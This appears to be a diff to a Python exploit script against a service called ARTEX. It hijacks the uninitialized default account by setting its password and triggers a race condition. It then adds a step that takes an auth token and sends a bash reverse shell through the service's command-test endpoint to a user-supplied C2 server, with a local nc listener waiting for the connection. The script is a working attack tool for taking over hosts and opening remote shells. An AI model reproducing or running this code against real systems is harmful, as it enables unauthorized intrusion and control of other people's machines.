@@ -4,9 +4,9 @@ from argparse import ArgumentParser
 from argparse import Namespace
 import requests
 import logging
-import sys
 import statistics
 import time
+import subprocess
 
 logging.basicConfig()
 
@@ -44,7 +44,12 @@ class ARTX:
         r = self.artx_request(endpoint, "POST", json={"password": str(pwd)})
         return (r.status_code, r.json())
 
-    def executeCommand(self, command: str, param: dict):
+    def getAuthToken(self, pwd: str):
+        endpoint = "/api/auth/login"
+        r = self.artx_request(endpoint, "POST", json={"username": "ARTEX", "password": str(pwd)})
+        return (r.status_code, r.json())
+
+    def executeCommand(self, token: str, command: str, param: dict):
         data = {
             "kind": "command",
             "exec": {
@@ -54,7 +59,7 @@ class ARTX:
             "param": param
         }
         endpoint = "/api/tools/custom/test"
-        r = self.artx_request(endpoint, "POST", json=data)
+        r = self.artx_request(endpoint, "POST", json=data, headers={"Authorization": f"Bearer {token}"})
         return (r.json().get("output"), r.json())
 
 def percentile(values, p):
@@ -73,7 +78,7 @@ def thread_request_status(artx: ARTX, pwd: str):
         body = req[1]
         elapsed = time.perf_counter() - started
         if req[0] == False:
-            print(f"[!] DoS-based Race Condition triggered! Latency: [{elapsed}]{' ' * 10}", end="\r")
+            print(f"[!] DoS-based Race Condition triggered! Latency: [{elapsed*1000:.1f} ms]{' ' * 10}", end="\r")
 
         return {
             "ok": True,
@@ -95,6 +100,8 @@ def thread_request_status(artx: ARTX, pwd: str):
 
 def main(args: Namespace):
     artx = ARTX(args.target)
+    c2_server = str(args.c2_server.split(":")[0])
+    c2_port = int(args.c2_server.split(":")[1])
 
     # Stage 1: Confirm it is an ARTEX service.
     print("[*] Checking the ARTEX service...")
@@ -113,10 +120,7 @@ def main(args: Namespace):
     check_default_pwd = artx.isInitialized()
     if check_default_pwd[0] == False:
         print("[!] ARTEX is NOT initialized!")
-        new_password = input("[?] Enter the new password [default: artxploit]: ")
-        if new_password == "":
-            new_password = "artxploit"
-        set_new_password = artx.setInitPassword(new_password)
+        set_new_password = artx.setInitPassword(args.password)
         if set_new_password[0] == 200:
             print("[+] The default ARTEX account was successfully hijacked.")
             print(f"[+] artex_token={set_new_password[1].get('token')}")
@@ -171,8 +175,28 @@ def main(args: Namespace):
     if failures:
         print("\nExample errors:")
         for r in failures[:5]:
-            print(f"  - {r['error']}")      
-        
+            print(f"  - {r['error']}")
+
+    if init_false == 0:
+        print("[!] The exploit most likely failed.")
+
+    print("[*] Retrieving the authentication token...")
+    auth = artx.getAuthToken(args.password)
+    if auth[0] == 401:
+        print("[-] Exploit failed.")
+        return
+    token = auth[1].get("token")
+    print(f"[+] Token found: {token}")
+
+    print("[*] Executing reverse shell command...")
+    listener = subprocess.Popen(["nc", "-lvnp", f"{c2_port}"])
+    artx.executeCommand(
+        token,
+        f"/bin/bash -c 'bash -i >& /dev/tcp/{c2_server}/{c2_port} 0>&1' &",
+        {}
+    )
+    listener.wait()
+    print("[+] Exploit completed.")
 
 if __name__ == "__main__":
     parser = ArgumentParser(
@@ -201,6 +225,12 @@ if __name__ == "__main__":
     parser.add_argument(
         "-p", "--password",
         help="New password to set",
+        type=str,
+        required=True
+    )
+    parser.add_argument(
+        "-c", "--c2-server",
+        help="C2 server address (e.g. 127.0.0.1:4444)",
         type=str,
         required=True
     )
